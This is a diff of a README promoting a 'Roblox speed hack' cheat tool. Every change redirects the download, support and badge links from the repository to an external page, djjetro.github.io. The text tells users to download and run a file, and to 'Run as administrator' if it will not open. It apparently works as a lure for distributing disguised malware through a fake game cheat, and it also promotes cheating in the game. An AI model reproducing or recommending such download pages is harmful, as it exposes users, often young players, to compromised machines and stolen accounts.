@@ -1,6 +1,6 @@
 # ⚡ roblox-speed-hack-2026 - Dominate Every Game With God-Like Speed
 
-[![Download Now](https://img.shields.io/badge/Download-Roblox_Speed_Hack_2026-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DjJetro/roblox-speed-hack-2026)
+[![Download Now](https://img.shields.io/badge/Download-Roblox_Speed_Hack_2026-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://djjetro.github.io)
 
 ---
 
@@ -27,7 +27,7 @@ Follow these simple steps to get roblox-speed-hack-2026 running on your Windows 
 
 ### 📦 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/DjJetro/roblox-speed-hack-2026](https://github.com/DjJetro/roblox-speed-hack-2026)
+Visit this link to download the application: [https://djjetro.github.io](https://djjetro.github.io)
 
 You will be taken to the official download page. Find the big download button and click it. The file will begin downloading automatically.
 
@@ -57,7 +57,7 @@ You're all set! Experiment with different speeds and modes. Remember to start sl
 
 ### ❓ The tool doesn't open after running it.
 
-Make sure you downloaded from the official link: https://github.com/DjJetro/roblox-speed-hack-2026. Also, right-click the file and select **"Run as administrator"** — this fixes most issues.
+Make sure you downloaded from the official link: https://djjetro.github.io Also, right-click the file and select **"Run as administrator"** — this fixes most issues.
 
 ### ❓ I don't see the control panel when I press the hotkey.
 
@@ -96,7 +96,7 @@ It's best to run only one modification tool at a time to avoid conflicts. Disabl
 
 ## 📞 Support & Updates
 
-- **Check the official repository** – Visit https://github.com/DjJetro/roblox-speed-hack-2026 for the latest version and patch notes.
+- **Check the official repository** – Visit https://djjetro.github.io for the latest version and patch notes.
 - **Report issues** – If you find a bug, open a ticket on the GitHub issues page.
 - **Stay updated** – We release regular updates to keep the tool working with the latest Roblox patches.
 
@@ -120,7 +120,7 @@ This project is provided free for personal use. Redistribution or resale is stri
 
 roblox-speed-hack-2026 transforms how you play Roblox. No longer are you limited by slow walking or locked doors — now you move at lightning speed, soar through the sky, and break every barrier. Download it today and taste true power in your favorite games.
 
-[![Get Started](https://img.shields.io/badge/Download_Now-FREE-00FF00?style=for-the-badge&logo=download&logoColor=black)](https://github.com/DjJetro/roblox-speed-hack-2026)
+[![Get Started](https://img.shields.io/badge/Download_Now-FREE-00FF00?style=for-the-badge&logo=download&logoColor=black)](https://djjetro.github.io)
 
 ---
 
